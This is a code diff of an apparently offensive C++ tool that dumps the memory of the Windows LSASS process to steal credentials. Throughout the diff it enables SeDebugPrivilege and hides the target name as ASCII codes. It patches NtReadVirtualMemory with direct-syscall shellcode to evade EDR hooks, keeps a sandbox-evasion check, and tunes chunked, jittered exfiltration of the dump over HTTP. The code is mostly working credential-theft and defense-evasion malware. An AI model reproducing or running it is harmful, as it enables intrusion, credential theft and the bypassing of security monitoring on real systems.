@@ -3,16 +3,16 @@
 // ired.team - Dumping Lsass without Mimikatz with MiniDumpWriteDump 
 // https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
 // 
-// ired.team - Full DLL Unhooking with C++
-// https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
-//
+// Hoang Bui - Bypass EDR’s memory protection, introduction to hooking
+// https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6
+// 
 
 #define NOMINMAX
+#include "catdumper.h"
 #include <windows.h>
 #include <wincrypt.h>
 #include <winhttp.h>
 #include <dbghelp.h>
-#include <psapi.h>
 #include <tlhelp32.h>
 #include <processsnapshot.h>
 #include <iostream>
@@ -22,6 +22,7 @@
 #include <chrono>
 #include <thread>
 
+#pragma comment (lib, "ntdll")
 #pragma comment (lib, "crypt32")
 #pragma comment (lib, "winhttp")
 #pragma comment (lib, "dbghelp")
@@ -112,39 +113,97 @@ std::string ASCIItoString(const std::vector<int>& asciiValues) {
 	return str;
 }
 
-// Unhook ntdll from AV/EDR
-void UnhookNtdll()
-{
-	std::vector<int> ntdllVect = { 110, 116, 100, 108, 108, 46, 100, 108, 108 }; // ntdll.dll
-	std::vector<int> ntdllAbsPathVect = { 67, 58, 92, 92, 87, 105, 110, 100, 111, 119, 115, 92, 92, 83, 121, 115, 116, 101, 109, 51, 50, 92, 92, 110, 116, 100, 108, 108, 46, 100, 108, 108 }; // C:\\Windows\\System32\\ntdll.dll
-	HANDLE process = GetCurrentProcess();
-	MODULEINFO mi = {};
-	HMODULE ntdllModule = GetModuleHandleA(ASCIItoString(ntdllVect).c_str());
+BOOL SetPrivilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege) {
+	fLookupPrivilegeValueW _LookupPrivilegeValueW = (fLookupPrivilegeValueW)GetProcAddress(LoadLibrary(L"advapi32"), "LookupPrivilegeValueW");
+	fNtAdjustPrivilegesToken _NtAdjustPrivilegesToken = (fNtAdjustPrivilegesToken)GetProcAddress(LoadLibrary(L"ntdll"), "NtAdjustPrivilegesToken");
 
-	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
-	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
-	HANDLE ntdllFile = CreateFileA(ASCIItoString(ntdllAbsPathVect).c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
-
-	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
-	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
-
-	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
-		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
-
-		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
-			DWORD oldProtection = 0;
-			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
-			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
-			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
-		}
+	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
+	HANDLE hToken = NULL;
+	LUID luid = { 0,0 };
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
+		if (hToken)
+			CloseHandle(hToken);
+		return false;
 	}
+	if (!_LookupPrivilegeValueW(0, lpszPrivilege, &luid)) {
+		if (hToken)
+			CloseHandle(hToken);
+		return false;
+	}
+	priv.PrivilegeCount = 1;
+	priv.Privileges[0].Luid = luid;
+	priv.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
+	if (!_NtAdjustPrivilegesToken(hToken, false, &priv, 0, 0, 0)) {
+		if (hToken)
+			CloseHandle(hToken);
+		return false;
+	}
+	if (hToken)
+		CloseHandle(hToken);
+	return true;
+}
 
-	CloseHandle(process);
-	CloseHandle(ntdllFile);
-	CloseHandle(ntdllMapping);
-	FreeLibrary(ntdllModule);
+// Get syscall ID for NtReadVirtualMemory
+BYTE GetNtRVM() {
+	fRtlGetVersion _RtlGetVersion = (fRtlGetVersion)GetProcAddress(LoadLibrary(L"ntdll"), "RtlGetVersion");
+	auto osVerInfo = OSVERSIONINFOEXW{ sizeof(OSVERSIONINFOEXW) };
+	_RtlGetVersion((POSVERSIONINFOW)&osVerInfo);
+	auto version_long = (osVerInfo.dwMajorVersion << 16) | (osVerInfo.dwMinorVersion << 8) | osVerInfo.wServicePackMajor;
+	enum supported_versions
+	{
+		win8 = 0x060200,
+		win81 = 0x060300,
+		win10 = 0x0A0000,
+	};
+
+	//                    7 and Pre-7     2012SP0   2012-R2    8.0     8.1    Windows 10+
+	//NtReadVirtualMemory 0x003c 0x003c    0x003d   0x003e    0x003d 0x003e 0x003f 0x003f 
+
+	BYTE syscall_id = 0x3f;								// Anything after Win8.1, probably Win10/Win11/>=Server2016
+	if (version_long > win81);							
+	else if (version_long < win8)						// Anything before Win8, probably Win7/Vista
+		syscall_id = 0x3c;
+	else if (version_long == win81)						// Win8.1/Server 2008 R2
+		syscall_id = 0x3e;
+	else if (version_long == win8)						// Win8/Server 2008 SP1
+		syscall_id = 0x3d;
+
+	return syscall_id;
+
+}
+
+// Unhook NtReadVirtualMemory
+VOID FreeNtRVM() {
+	BYTE syscall = GetNtRVM();
+
+// Prepare shellcode for x86 or x64
+#ifdef  _WIN64
+	BYTE Shellcode[] =
+	{
+		0x4C, 0x8B, 0xD1,                               // mov r10, rcx; NtReadVirtualMemory
+		0xB8, 0x3c, 0x00, 0x00, 0x00,                   // eax, 3ch
+		0x0F, 0x05,                                     // syscall
+		0xC3                                            // retn
+	};
+
+	Shellcode[4] = syscall;
+#else
+	BYTE Shellcode[] =
+	{
+		0xB8, 0x3c, 0x00, 0x00, 0x00,                   // mov eax, 3ch; NtReadVirtualMemory
+		0x33, 0xC9,                                     // xor ecx, ecx
+		0x8D, 0x54, 0x24, 0x04,                         // lea edx, [esp + arg_0]
+		0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,       // call large dword ptr fs : 0C0h
+		0x83, 0xC4, 0x04,                               // add esp, 4
+		0xC2, 0x14, 0x00                                // retn 14h
+	};
+
+	Shellcode[1] = syscall;
+#endif
+
+	// Repatching the jmp
+	fNtWriteVirtualMemory _NtWriteVirtualMemory = (fNtWriteVirtualMemory)GetProcAddress(LoadLibrary(L"ntdll"), "NtWriteVirtualMemory");
+	_NtWriteVirtualMemory(GetCurrentProcess(), NtReadVirtualMemory, Shellcode, sizeof(Shellcode), NULL);
 }
 
 // Simple compile-time polymorphism
@@ -275,8 +334,8 @@ void SendDataInChunks(const std::string& data, const std::string& hostname, cons
 	std::random_device rd;
 	std::mt19937 gen(rd());
 
-	std::uniform_int_distribution<> sizeDist(3 * 1024 * 1024, 6 * 1024 * 1024); // 3 MB to 6 MB
-	std::uniform_int_distribution<> timeDist(2000, 5000); // 2 seconds to 5 seconds
+	std::uniform_int_distribution<> sizeDist(2 * 1024 * 1024, 4 * 1024 * 1024); // 2 MB to 4 MB
+	std::uniform_int_distribution<> timeDist(1000, 2000); // 1 second to 2 seconds
 
 	size_t offset = 0;
 	size_t totalSize = data.size();
@@ -310,7 +369,7 @@ int main() {
 	if (VirtualFreeEx(GetCurrentProcess(), VirtualAllocExNuma(GetCurrentProcess(), NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0), 0, MEM_RELEASE) == 0) return 1;
 
 	// Instantiate variables
-	DWORD lsassPID = 0;
+	DWORD pid = 0;
 	HANDLE lsassHandle = NULL;
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	LPCWSTR processName = L"";
@@ -318,20 +377,21 @@ int main() {
 	processEntry.dwSize = sizeof(PROCESSENTRY32);
 
 	// Get lsass PID
-	std::vector<int> lsassVect = { 108, 115, 97, 115, 115, 46, 101, 120, 101 }; // lsass.exe
+	std::vector<int> exevect = { 108, 115, 97, 115, 115, 46, 101, 120, 101 }; // lsass.exe
 	if (Process32First(snapshot, &processEntry)) {
-		while (_wcsicmp(processName, ASCIItoWString(lsassVect).c_str()) != 0) {
+		while (_wcsicmp(processName, ASCIItoWString(exevect).c_str()) != 0) {
 			Process32Next(snapshot, &processEntry);
 			processName = processEntry.szExeFile;
-			lsassPID = processEntry.th32ProcessID;
+			pid = processEntry.th32ProcessID;
 		}
 	}
 
-	// Unhook ntdll before interacting with lsass
-	UnhookNtdll();
-
 	// Open lsass
-	lsassHandle = OpenProcess(0x000F0000L | 0x00100000L | 0xFFF, 0, lsassPID);
+	SetPrivilege(L"SeDebugPrivilege", TRUE);
+	lsassHandle = OpenProcess(0x000F0000L | 0x00100000L | 0xFFF, 0, pid);
+	
+	// Unhook NtReadVirtualMemory
+	FreeNtRVM();
 
 	// Set up callback for in-memory procedures
 	HANDLE snapshotHandle = NULL;
@@ -345,7 +405,7 @@ int main() {
 	PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
 
 	// Dump lsass
-	BOOL isDumped = MiniDumpWriteDump(snapshotHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
+	BOOL isDumped = MiniDumpWriteDump(snapshotHandle, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
 	std::wstring err = GetLastErrorMessage();
 
 	// Free the snapshot
